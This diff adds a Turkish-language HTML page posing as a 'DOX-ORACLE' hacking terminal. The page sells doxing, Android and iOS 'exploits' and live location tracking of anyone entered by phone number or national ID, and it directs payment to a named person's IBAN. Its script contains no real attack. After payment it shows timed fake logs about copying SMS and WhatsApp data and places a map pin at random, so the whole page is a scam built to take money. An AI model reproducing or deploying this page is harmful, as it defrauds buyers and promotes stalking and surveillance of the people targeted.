@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DOX_ORACLE_SYSTEMS_v19</title>
+    <style>
+        body { background: #000; color: #00FF41; font-family: 'Courier New', monospace; margin: 0; padding: 15px; height: 100vh; overflow: hidden; }
+        
+        /* GİRİŞ EKRANI */
+        #intro { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .logo { font-size: 26px; font-weight: bold; text-shadow: 0 0 20px #00FF41; margin-bottom: 5px; color: #00FF41; letter-spacing: 3px; }
+        .sub-logo { font-size: 10px; color: #fff; margin-bottom: 20px; opacity: 0.7; }
+        .guide-box { background: #080808; border: 1px solid #333; padding: 15px; font-size: 11px; color: #aaa; text-align: left; max-height: 200px; overflow-y: auto; margin-bottom: 20px; border-radius: 5px; }
+        .guide-box b { color: #00FF41; }
+
+        #console { display: none; flex-direction: column; height: 100%; border: 1px solid #111; padding: 10px; box-sizing: border-box; }
+        .header { border-bottom: 1px solid #00FF41; margin-bottom: 10px; font-size: 10px; opacity: 0.5; padding-bottom: 5px; }
+        select, input { background: #111; border: 1px solid #222; color: #fff; font-family: inherit; font-size: 16px; outline: none; width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; }
+        #logs { flex-grow: 1; overflow-y: auto; font-size: 12px; color: #00cc33; margin-top: 10px; }
+        
+        /* ÖDEME MODALI */
+        .payment-modal { display: none; position: absolute; top: 5%; left: 5%; right: 5%; background: #050505; border: 2px solid #00FF41; padding: 20px; z-index: 100; border-radius: 10px; box-shadow: 0 0 50px rgba(0, 255, 65, 0.3); text-align: center; }
+        .iban-box { background: #111; padding: 15px; border: 1px dashed #00FF41; color: #fff; margin: 15px 0; font-size: 13px; text-align: left; }
+        .price-tag { font-size: 32px; color: #fff; font-weight: bold; margin: 10px 0; }
+        .btn { background: #00FF41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 14px; text-transform: uppercase; box-shadow: 0 0 10px #00FF41; }
+        
+        #map-container { display: none; width: 100%; height: 140px; background: #050505; border: 1px solid #222; margin: 10px 0; position: relative; }
+        #map-img { width: 100%; height: 100%; object-fit: cover; opacity: 0.3; }
+        #map-pin { position: absolute; width: 12px; height: 12px; background: red; border-radius: 50%; box-shadow: 0 0 10px red; display: none; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.8); opacity: 0; } }
+    </style>
+</head>
+<body>
+
+<div id="intro">
+    <div class="logo">DOX-ORACLE-SYSTEMS</div>
+    <div class="sub-logo">ENCRYPTED TERMINAL // OPERATOR: DOĞAN UÇAR</div>
+    
+    <div class="guide-box">
+        <b>> LİSANS SÖZLEŞMESİ:</b><br>
+        1. Bu yazılım 0-Day açıkları üzerinden veri madenciliği yapar.<br>
+        2. Apple iOS 17.x ve Android 14.x sistemleri %100 desteklenir.<br>
+        3. Sunucu bağlantı ücreti (Aktivasyon) iade edilemez.<br>
+        4. Tüm veriler 256-bit AES ile şifrelenerek operatöre iletilir.<br>
+        5. Sorgu paneli kullanım süresi aktivasyondan itibaren 5 aydır.
+    </div>
+    
+    <button class="btn" onclick="enterSystem()">SİSTEMİ BAŞLAT (AUTH_REQUIRED)</button>
+</div>
+
+<div id="console">
+    <div class="header">DOX_ORACLE_V19 // ROOT_SHELL_ACTIVE // DOĞAN_UÇAR</div>
+
+    <div id="step-1">
+        <select id="operationType">
+            <option value="none">İşlem Türünü Seçin</option>
+            <option value="sorgu">VIP Sorgu Paneli (5 Ay) - 4.000 TL</option>
+            <option value="android">Android Remote Exploit - 7.000 TL</option>
+            <option value="apple">Apple iOS Kernel Bypass - 14.000 TL</option>
+        </select>
+        <input type="text" id="targetId" placeholder="Target Number / ID / TC">
+        <button class="btn" onclick="startOperation()">SİSTEMİ TETİKLE</button>
+    </div>
+
+    <div class="payment-modal" id="paywall">
+        <h3 style="margin-top:0; color:#00FF41;">🛑 AKTİVASYON GEREKLİ</h3>
+        <p style="font-size:11px; color:#aaa;">Hedef kilitlendi. Veri çekimi için sunucu bedelini yatırın.</p>
+        <div class="price-tag" id="priceText">0 TL</div>
+        <div class="iban-box">
+            <strong>ALICI:</strong> DOĞAN UÇAR<br>
+            <strong>IBAN:</strong> TR36 0020 6001 9905 6606 9100 01<br>
+            <strong>BANKA:</strong> AKBANK<br>
+            <strong>AÇIKLAMA:</strong> LİSANS-AKTİVASYON
+        </div>
+        <button class="btn" onclick="confirmPayment()">ÖDEME YAPTIM - ONAYLA</button>
+    </div>
+
+    <div id="map-container">
+        <img id="map-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Turkey_location_map.svg/1200px-Turkey_location_map.svg.png" alt="TR Map">
+        <div id="map-pin"></div>
+    </div>
+    <div id="logs"></div>
+</div>
+
+<script>
+    function enterSystem() { document.getElementById('intro').style.display = 'none'; document.getElementById('console').style.display = 'flex'; }
+    const logArea = document.getElementById('logs');
+    function addLog(text) {
+        const div = document.createElement('div');
+        div.innerText = text;
+        logArea.appendChild(div);
+        logArea.scrollTop = logArea.scrollHeight;
+    }
+    function startOperation() {
+        const op = document.getElementById('operationType').value;
+        const target = document.getElementById('targetId').value;
+        if(op === "none" || !target) { alert("Lütfen verileri girin!"); return; }
+        document.getElementById('step-1').style.display = 'none';
+        addLog("> Initializing Dox-Oracle bypass...");
+        setTimeout(() => {
+            addLog("> Target Analyzed: " + target);
+            setTimeout(() => {
+                let price = op === "sorgu" ? "4.000" : (op === "android" ? "7.000" : "14.000");
+                document.getElementById('priceText').innerText = price + " TL";
+                document.getElementById('paywall').style.display = 'block';
+            }, 1200);
+        }, 800);
+    }
+    function confirmPayment() {
+        document.getElementById('paywall').style.display = 'none';
+        addLog("> Doğan Uçar banka havuzu sorgulanıyor... [AÇIKLAMA: LİSANS]");
+        setTimeout(() => {
+            addLog("> [!] ÖDEME ONAYLANDI. Sızma ve Konum takibi başlatıldı.");
+            document.getElementById('map-container').style.display = 'block';
+            runFinalSequence();
+        }, 5000);
+    }
+    function runFinalSequence() {
+        const pin = document.getElementById('map-pin');
+        pin.style.top = (Math.floor(Math.random() * 40) + 30) + "%";
+        pin.style.left = (Math.floor(Math.random() * 50) + 20) + "%";
+        pin.style.display = "block";
+        const steps = ["> [!] Uydu bağlantısı (Echelon) sağlandı.", "> Canlı konum verisi çekiliyor...", "> Veri paketleri (SMS/WA/Media) kopyalanıyor...", "> SİSTEM TAMAMEN ELE GEÇİRİLDİ."];
+        let i = 0;
+        const timer = setInterval(() => {
+            if(i < steps.length) { addLog(steps[i]); i++; } 
+            else { clearInterval(timer); addLog("OPERASYON BAŞARILI."); }
+        }, 2000);
+    }
+</script>
+</body>
+</html>
